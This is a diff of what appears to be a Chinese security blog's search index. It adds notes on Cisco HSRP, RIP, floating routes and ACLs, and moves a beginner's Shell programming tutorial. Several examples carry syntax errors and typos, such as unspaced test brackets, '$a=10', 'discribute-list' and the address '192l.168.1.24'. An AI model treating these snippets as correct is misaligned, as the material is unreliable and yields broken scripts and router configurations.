@@ -3200,6 +3161,45 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>HTTP</tag>
         <tag>HTTPS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
+    <url>/archives/db738475.html</url>
+    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
+<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
+<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
+<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
+<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
+<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
+<p>RIP的水平分割</p>
+<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
+<p>RIP的保持定时器法</p>
+<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
+<p>RIP的触发更新法</p>
+<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
+<p>收敛机制</p>
+<p><img src="/archives/db738475/QQ20210329085323.png"></p>
+<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
+<p>RIP帧格式</p>
+<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
+<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
+<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
+<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
+<p>ACL包括标准acl 与扩展acl</p>
+<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
+<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
+<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>协议规范</category>
+      </categories>
+      <tags>
+        <tag>HRSP</tag>
+        <tag>RIP</tag>
+        <tag>ACL</tag>
+        <tag>IPSec</tag>
       </tags>
   </entry>
   <entry>
@@ -3562,79 +3562,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>Shell编程</title>
-    <url>/archives/6309c3f8.html</url>
-    <content><![CDATA[<h1 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h1><h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>使用普通的文本编辑器即可编写,这里创建一个a.sh的shell脚本</p>
-<p>开头第一行为 ： #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;目录表示shell类型</p>
-<p>执行方法： cd到文件所在目录，.&#x2F;a.sh &#x2F;&#x2F;注意不可直接写a.sh，如果这样写系统会到环境变量的path项中添加的目录中去寻找该文件执行，因为往往我们的shell脚本并没有在这些目录里面则系统无法找到该文件。</p>
-<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>
-
-<p>等号两端不能有空格</p>
-<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>{}用于定义变量边界</p>
-<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #修改只读变量会报错</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>
-
-<p>不能删除只读变量</p>
-<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>**局部变量：**shell脚本中定义的变量，只能在脚本中使用</p>
-<p>**环境变量：**所有的程序，包括shell启动的程序都可以访问环境变量</p>
-<p>**shell变量：**由shell程序设置的特殊变量，有一部分是环境变量有一部分是局部变量</p>
-<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>可以使用单引号也可以使用双引号</p>
-<p>单引号中的内容原样输出</p>
-<p>双引号中的内容可以包含变量，</p>
-<p>\ 为转义标志</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#输出8</span></span><br></pre></td></tr></table></figure>
-
-<p>提取子字符串</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># 输出rma</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>通过下标访问，下标的开始值为0，只有一维数组，且无大小限制</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#声明数组</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#获取数组中所有元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>获取数组长度</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#获取数组中某个元素的长度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>多行注释</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
-
-<p>参数传递</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 文件名a.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名为<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>chmod +x a.sh</p>
-<p>.&#x2F;a.sh 12 “hjx” ‘red’</p>
-<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
-<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#使用let命令，在变量计算中就不需要加上$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p>当条件不成立的时候执行代码块</p>
-<p>当条件成立时跳出循环，与while正好相反</p>
-<h2 id="case-…-esac"><a href="#case-…-esac" class="headerlink" title="case … esac"></a>case … esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;你选择了1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;你选择了2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;请正常输入&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;这是一个函数&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>. filename</p>
-<p>source filename</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>编程语言</category>
-      </categories>
-      <tags>
-        <tag>Shell编程</tag>
-        <tag>Shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入</title>
     <url>/archives/e73517db.html</url>
     <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><h2 id="数字注入"><a href="#数字注入" class="headerlink" title="数字注入"></a>数字注入</h2><p><strong>查询语句</strong>：select * from table where id&#x3D;1</p>
@@ -3888,6 +3815,79 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>漏洞原理</tag>
         <tag>PHP</tag>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shell编程</title>
+    <url>/archives/6309c3f8.html</url>
+    <content><![CDATA[<h1 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h1><h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>使用普通的文本编辑器即可编写,这里创建一个a.sh的shell脚本</p>
+<p>开头第一行为 ： #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;目录表示shell类型</p>
+<p>执行方法： cd到文件所在目录，.&#x2F;a.sh &#x2F;&#x2F;注意不可直接写a.sh，如果这样写系统会到环境变量的path项中添加的目录中去寻找该文件执行，因为往往我们的shell脚本并没有在这些目录里面则系统无法找到该文件。</p>
+<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>
+
+<p>等号两端不能有空格</p>
+<h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>{}用于定义变量边界</p>
+<h2 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #修改只读变量会报错</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>
+
+<p>不能删除只读变量</p>
+<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>**局部变量：**shell脚本中定义的变量，只能在脚本中使用</p>
+<p>**环境变量：**所有的程序，包括shell启动的程序都可以访问环境变量</p>
+<p>**shell变量：**由shell程序设置的特殊变量，有一部分是环境变量有一部分是局部变量</p>
+<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>可以使用单引号也可以使用双引号</p>
+<p>单引号中的内容原样输出</p>
+<p>双引号中的内容可以包含变量，</p>
+<p>\ 为转义标志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#输出8</span></span><br></pre></td></tr></table></figure>
+
+<p>提取子字符串</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># 输出rma</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>通过下标访问，下标的开始值为0，只有一维数组，且无大小限制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#声明数组</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#获取数组中所有元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取数组长度</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#获取数组中某个元素的长度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多行注释</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
+
+<p>参数传递</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 文件名a.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名为<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>chmod +x a.sh</p>
+<p>.&#x2F;a.sh 12 “hjx” ‘red’</p>
+<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
+<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#使用let命令，在变量计算中就不需要加上$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>当条件不成立的时候执行代码块</p>
+<p>当条件成立时跳出循环，与while正好相反</p>
